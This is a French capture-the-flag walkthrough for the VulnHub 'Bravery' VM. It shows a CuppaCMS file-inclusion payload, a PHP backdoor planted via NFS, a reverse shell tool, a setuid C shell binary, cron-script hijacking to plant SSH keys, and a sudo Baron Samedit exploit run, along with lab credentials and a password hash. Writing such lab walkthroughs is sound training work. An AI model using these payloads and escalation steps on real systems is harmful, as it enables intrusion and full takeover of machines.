# Solution du CTF Bravery de VulnHub

Wow! Such ports!
----------------

[Bravery](https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/) est un CTF d'une série créé par un certain Donavan.  

Il y a 8 opus dans cette série, ce serait bête de ne pas en essayer au moins un.  

On dispose juste de cette description pour le CTF :  

> This machine hopes to inspire BRAVERY in you; this machine may surprise you from the outside.  
> 
> This is designed for OSCP practice, and the original version of the machine was used for a CTF.  
> 
> It is now revived, and made more nefarious than the original.

D'accord. Je vous laisse apprécier le résultat du scan de port dans sa totalité :  

```plain
$ sudo nmap -T5 -sC -sV -p- 192.168.101.129 
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.101.129
Host is up (0.00053s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4d:8f:bc:01:49:75:83:00:65:a9:53:a9:75:c6:57:33 (RSA)
|   256 92:f7:04:e2:09:aa:d0:d7:e6:fd:21:67:1f:bd:64:ce (ECDSA)
|_  256 fb:08:cd:e8:45:8c:1a:c1:06:1b:24:73:33:a5:e4:77 (ED25519)
53/tcp    open  domain      dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Apache HTTP Server Test Page powered by CentOS
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      37557/tcp   nlockmgr
|   100021  1,3,4      39589/tcp6  nlockmgr
|   100021  1,3,4      40061/udp6  nlockmgr
|   100021  1,3,4      43922/udp   nlockmgr
|   100024  1          37844/tcp   status
|   100024  1          39931/tcp6  status
|   100024  1          55612/udp6  status
|   100024  1          60094/udp   status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp   open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2018-06-10T15:53:25
|_Not valid after:  2019-06-10T15:53:25
|_http-title: Apache HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_ssl-date: TLS randomness does not represent time
445/tcp   open  netbios-ssn Samba smbd 4.7.1 (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     3 (RPC #100227)
3306/tcp  open  mysql       MariaDB (unauthorized)
8080/tcp  open  http        nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome to Bravery! This is SPARTA!
| http-robots.txt: 4 disallowed entries 
|_/cgi-bin/ /qwertyuiop.html /private /public
20048/tcp open  mountd      1-3 (RPC #100005)
37557/tcp open  nlockmgr    1-4 (RPC #100021)
37844/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:AE:20:EA (VMware)
Service Info: Host: BRAVERY

Host script results:
| smb2-time: 
|   date: 2021-12-13T21:03:37
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BRAVERY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.1)
|   Computer name: localhost
|   NetBIOS computer name: BRAVERY\x00
|   Domain name: \x00
|   FQDN: localhost
```

Il faut bien commencer par quelque chose donc choisissons SMB :  

```plain
$ smbclient -U "" -N -L //192.168.101.129

        Sharename       Type      Comment
        ---------       ----      -------
        anonymous       Disk      
        secured         Disk      
        IPC$            IPC       IPC Service (Samba Server 4.7.1)
SMB1 disabled -- no workgroup available
```

Ce partage anonyme contient pas mal de dossiers :  

```plain
$ smbclient -U "" -N //192.168.101.129/anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 28 15:01:35 2018
  ..                                  D        0  Thu Jun 14 18:30:39 2018
  patrick's folder                    D        0  Fri Sep 28 14:38:27 2018
  qiu's folder                        D        0  Fri Sep 28 15:27:20 2018
  genevieve's folder                  D        0  Fri Sep 28 15:08:31 2018
  david's folder                      D        0  Wed Dec 26 03:19:51 2018
  kenny's folder                      D        0  Fri Sep 28 14:52:49 2018
  qinyi's folder                      D        0  Fri Sep 28 14:45:22 2018
  sara's folder                       D        0  Fri Sep 28 15:34:23 2018
  readme.txt                          N      489  Fri Sep 28 15:54:03 2018
```

Dans chaque dossier peu de trouver pas mal de fichiers inutiles, le CTF tente aussi de tester nos compétences à aller droit au but.  

Il ne va pas être déçu :  

```plain
$ find . -type f -size 0 -exec rm {} \;
```

Ce qui réduit considérablement :  

```plain
.
├── genevieve's folder
│   ├── CMS
│   │   └── migration
│   │       └── important!
│   └── email
│       └── spear
├── kenny's folder
│   └── vuln_assessment_team
│       └── windows
│           └── XP_disclaimer
├── patrick's folder
│   └── work!
│       ├── present_for_qiu
│       │   └── present
│       └── samba
│           └── david_secured_share
│               └── readme
│                   └── readme.txt
├── readme.txt
└── sara's folder
    ├── email
    │   └── 2048
    └── gossip_corner
        ├── gossip18
        ├── gossip23
        ├── gossip27
        └── gossip5
```

Voici le contenu de quelques fichiers, d'abord le *readme.txt* à la racine :  

```plain

-- READ ME! --                                                                                                         

This is an INTERNAL file-sharing system across SMB. While awaiting migration to Sharepoint, we are currently relying on the use of the SMB protocol to share information.

Once we migrate everything to Sharepoint, we will kill off this temporary service. This service will be re-purposes to only share UNCLASSIFIED information.

We also noticed the archival of plenty of e-mail. Please remove all of that before migration, unless you need them.    

Regards                                                                                                                
Genevieve the Brave
```

Le fichier *important!* :  

```plain
need to migrate CMS. obsolete. speak to qiu about temporarily using her IIS to test a sharepoint installation.
```

Le fichier *spear* :  

```plain

Amidst the flurry of content are certain files that may stand out. Smart bravery will allow you to read what you want; stupid bravery is called recklessness.
```

Le fichier *present* :  

```plain
Should I bring her to watch the "Phantom of the Opera"?

Hmmmm... but she looks so stressed recently... :-(
```

et finalement le *readme.txt* de *David* :  

```plain
Please DO NOT spread the password around.
```

J'ai aussi rassemblé le contenu des fichiers *gossip* :  

```plain
Qiu gives me too much work. I'm really stressed.
Que sera sera, whatever will be, will be.
Misconfigurations are the nightmare of system administrators.
If only I could get back at the boss... she's so nasty. She controls EVERYTHING and doesn't trust me in even administering her tomcat server.
```

Tout ça ça ressemble surtout à du bullshit.  

Stop the bullshit
-----------------

L'autre partage SMB (*secured*) nécessite des identifiants que l'on a pas.  

De son côté NFS partage bien des données :  

```plain
$ showmount -e 192.168.101.129 
Export list for 192.168.101.129:
/var/nfsshare *
```

On monte le dossier :  

```plain
$ sudo mount -t nfs 192.168.101.129:/var/nfsshare jail/
```

L'utilitaire *tree* sous Linux est toujours appréciable, mangez-en.  

```plain
.
├── [  29]  discovery
├── [  51]  enumeration
├── [  20]  explore
├── [  19]  itinerary
│   └── [1.7K]  david
├── [ 104]  password.txt
├── [  67]  qwertyuioplkjhgfdsazxcvbnm
└── [  15]  README.txt
```

Rien de plus à signaler (bullshit again).  

Les habitués de CTFs devinent la marche à suivre pour NFS mais chut!  

Du côté du port 80 on a la page de test de CentOS. Le port 443 semble servir exactement le même contenu.  

Un *feroxbuster* ne remontera pas grand chose de bien utile (toujours du blablah et des trolls).  

J'ai alors créé une wordlist à partir des noms d'utilisateurs qui apparaissaient dans le dossier SMB :  

```plain
genevieve
patrick
qiu
david
kenny
qinyi
sara
```

Une énumération web à partir de ces mots remontent l'URL *http://192.168.101.129/genevieve/*.  

A l'intérieur on trouve un CuppaCMS connu pour être vulnérable [à une faille d'inclusion locale / distante](https://www.exploit-db.com/exploits/25971).  

Ainsi si on demande l'URL :  

```plain
http://192.168.101.129/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

On obtient la liste des utilisateurs dont voici deux lignes :  

```plain
david:x:1000:1000:david:/home/david:/bin/bash
rick:x:1004:1004::/home/rick:/bin/bash
```

L'inclusion distante semble échouer. Restriction dans la config PHP ? Filtrage du trafic sortant ?  

Peut importe, on a un partage NFS sur lequel on peut écrire et on sait que ça correspond au dossier */var/nfsshare*, on a donc y déposer notre backdoor PHP puis l'inclure :  

```plain
http://192.168.101.129/genevieve/cuppaCMS//alerts/alertConfigField.php?urlConfig=/var/nfsshare/test.php&cmd=id
```

On obtient notre exécution de commandes en tant que *uid=48(apache) gid=48(apache) groups=48(apache) context=system\_u:system\_r:httpd\_t:s0*.  

Une exécution de [reverse-ssh](https://github.com/Fahrj/reverse-ssh) plus tard, je fouille un peu dans les fichiers comme la Configuration du Cuppa :  

```php
<?php 
        class Configuration{
                public $host = "localhost";
                public $db = "bravery";
                public $user = "root";
                public $password = "r00tisawes0me";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "goodtech";
                public $secure_login_redirect = "doorshell.jpg";
        } 
?>
```

Mais dans les bases MySQL je ne trouve rien d'intéressant.  

Voici les fichiers appartenant aux utilisateurs mentionnés plus tôt :  

```plain
$ find / -user david -ls 2> /dev/null
628169    0 -rw-rw----   1 david    mail            0 Jun 10  2018 /var/spool/mail/david
51235890    4 -rw-r--r--   1 david    users          31 Dec 13 19:04 /var/nfsshare/test.php
51235889 3760 -rwxr-xr-x   1 david    users     3850240 Dec 13 19:07 /var/nfsshare/reverse-sshx64
628165    0 drwx------  14 david    david         279 Sep 29  2018 /home/david
1290460    0 drwxrwxrwx   2 david    smbgrp         62 Sep 28  2018 /samba/secured

$ find / -user rick -ls 2> /dev/null 
172662    0 -rw-rw----   1 rick     mail            0 Jul 10  2018 /var/spool/mail/rick
35281512    0 drwx------   3 rick     rick           78 Jul 10  2018 /home/rick
```

L'utilisateur David a l'UID et le GID 1000. Je créé le petit code C que voici :  

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(void) {
  setreuid(1000, 1000);
  setregid(1000, 1000);
  system("bash -p");
  return 0;
}
```

Je compile, je met les bits set(u|g)id et je met sur le partage NFS :  

```bash
gcc -o setuid_david setuid_david.c -static
sudo chown 1000:1000 setuid_david
sudo chmod u+s setuid_david
sudo chmod g+s setuid_david
sudo mv setuid_david /mnt/bravery/
```

Côté VM tout a marché comme sur des roulettes :  

```plain
bash-4.2$ ls -l /var/nfsshare/setuid_david
-rwsr-sr-x. 1 david david 3536680 Dec 13 19:31 /var/nfsshare/setuid_david
bash-4.2$ /var/nfsshare/setuid_david
[david@bravery /]$ id
uid=1000(david) gid=1000(david) groups=1000(david),48(apache) context=system_u:system_r:httpd_t:s0
```

On peut aussi jeter un oeil au partage qui nous était restreint :  

```plain
[david@bravery ~]$ ls -l /samba/secured/
total 12
-rw-r--r--. 1 root root 376 Jun 16  2018 david.txt
-rw-r--r--. 1 root root 398 Jul 23  2018 genevieve.txt
-rw-r--r--. 1 root root 323 Jul 23  2018 README.txt
```

Je vous met le contenu du *README.txt* mais je ne suis pas sûr qu'il soit d'un quelconque intérêt :  

```plain
README FOR THE USE OF THE BRAVERY MACHINE:

Your use of the BRAVERY machine is subject to the following conditions:

1. You are a permanent staff in Good Tech Inc.
2. Your rank is HEAD and above.
3. You have obtained your BRAVERY badges.

For more enquiries, please log into the CMS using the correct magic word: goodtech.
```

Je rapatrie et exécute LinPEAS qui contient Linux Exploit Suggester 1 et 2 :  

```plain
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},[ RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7} ],ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,[ RHEL=5|6|7 ],ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2017-1000367] Sudoer-to-root

   Details: https://www.sudo.ws/alerts/linux_tty.html
   Exposure: probable
   Tags: [ RHEL=7 ]{sudo:1.8.6p7}
   Download URL: https://www.qualys.com/2017/05/30/cve-2017-1000367/linux_sudo_cve-2017-1000367.c
   Comments: Needs to be sudoer. Works only on SELinux enabled systems

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: probable
   Tags: RHEL=6,[ RHEL=7 ]{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-4989] setroubleshoot 2

   Details: https://c-skills.blogspot.com/2016/06/lets-feed-attacker-input-to-sh-c-to-see.html
   Exposure: probable
   Tags: [ RHEL=6|7 ]
   Download URL: https://github.com/stealth/troubleshooter/raw/master/straight-shooter.c

[+] [CVE-2015-5287] abrt/sosreport-rhel7

   Details: https://www.openwall.com/lists/oss-security/2015/12/01/1
   Exposure: probable
   Tags: [ RHEL=7 ]{abrt:2.1.11-12.el7}
   Download URL: https://www.openwall.com/lists/oss-security/2015/12/01/1/1

[+] [CVE-2015-3315] raceabrt

   Details: http://seclists.org/oss-sec/2015/q2/130
   Exposure: probable
   Tags: fedora=19{abrt:2.1.5-1.fc19},fedora=20{abrt:2.2.2-2.fc20},fedora=21{abrt:2.3.0-3.fc21},[ RHEL=7 ]{abrt:2.1.11-12.el7}
   Download URL: https://gist.githubusercontent.com/taviso/fe359006836d6cd1091e/raw/32fe8481c434f8cad5bcf8529789231627e5074c/raceabrt.c

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

Linux Exploit suggester 2
  [1] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [2] pp_key
      CVE-2016-0728
      Source: http://www.exploit-db.com/exploits/39277
  [3] timeoutp1wn
      CVE-2014-0038
      Source: http://www.exploit-db.com/exploits/31346
```

Copier c'est voler
------------------

On remarque surtout que la commande *cp* est setuid root :  

```plain
-rwsr-xr-x. 1 root root 155176 Apr 11  2018 /usr/bin/cp
```

Si on tente de dossier par exemple */etc/shadow* dans un dossier, il perd ses attributs et est illisible :  

```plain
----------. 1 root  david 1516 Dec 13 18:13 shadow
```

Si en revanche on écrase un fichier à nous alors les permissions sont bonnes :  

```plain
-rw-rw-r--. 1 david david 1516 Dec 13 18:16 bidule
```

Les mots de passe du *shadow* semblent être trop compliqués, la wordlist rockyou n'en arrive pas à bout.  

L'utilisateur *root* a une tâche planifiée :  

```plain
[david@bravery tmp]$ cp /var/spool/cron/root bidule
[david@bravery tmp]$ cat bidule 
*/5 * * * * /bin/sh /var/www/maintenance.sh
[david@bravery tmp]$ ls -l /var/www/maintenance.sh
-rw-r--r--. 1 root root 130 Jun 23  2018 /var/www/maintenance.sh
```

On va écraser le script existant avec des commandes à nous :  

```plain
[david@bravery tmp]$ cp my_script.sh /var/www/maintenance.sh
[david@bravery tmp]$ cat /var/www/maintenance.sh
#!/bin/sh
mkdir -p /root/.ssh
cp /home/david/.ssh/authorized_keys /root/.ssh/
```

Si on merdouille on pourrait débuger tout ça en copiant et lisant les mails de l'utilisateur (*/var/spool/mail/root*).  

5 minutes plus tard ma commande est passée :  

```plain
$ ssh root@192.168.101.129
Enter passphrase for key '/home/devloop/.ssh/id_rsa': 
[root@bravery ~]# id
uid=0(root) gid=0(root) groupes=0(root) contexte=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@bravery ~]# cat proof.txt 
Congratulations on rooting BRAVERY. :)
```

Qui peut le moins peut le plus
------------------------------

Evidemment on aurait pu mettre directement un binaire setuid root sur le partage NFS et shunter David :  

```plain
[david@bravery nfsshare]$ ./setuid_root 
ABRT has detected 1 problem(s). For more info run: abrt-cli list --since 1530713425
[root@bravery nfsshare]# head -1 /etc/shadow
root:$6$8uypxcySPhhZ/p1p$1Sj6Bbm/tTNOqdmjVWJh9KXH/osqfXi4WQfVkoSEgL5OSKGo7cxdbQRQo.yzibIddtabSHYvDs1IbITaGTd/o.::0:99999:7:::
```

Alternative happy ending
------------------------

La VM est vulnérable à la faille [Sudo Baron Samedit](https://github.com/worawit/CVE-2021-3156) mais l'exploit à utiliser est différent, celui-ci ajoute un utilisateur *gg* (avec le même mot de passe) :  

```plain
[david@bravery CVE-2021-3156-main]$ python exploit_userspec.py
--- snip tons of output ---
offset to first userspec: 0x740

cmnd size: 0xed0
offset to defaults: 0x20
offset to first userspec: 0x740
offset to userspec: 0x0

to skip finding offsets next time no this machine, run: 
exploit_userspec.py 0xed0 0x20 0x740 0x0
gg:$5$a$gemgwVPxLx/tdtByhncd4joKlMRYQ3IVwdoBXPACCL2:0:0:gg:/root:/bin/bash
success at 1513
[david@bravery CVE-2021-3156-main]$ su gg
Password: 
[root@bravery CVE-2021-3156-main]# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
```


*Published December 14 2021 at 13:49*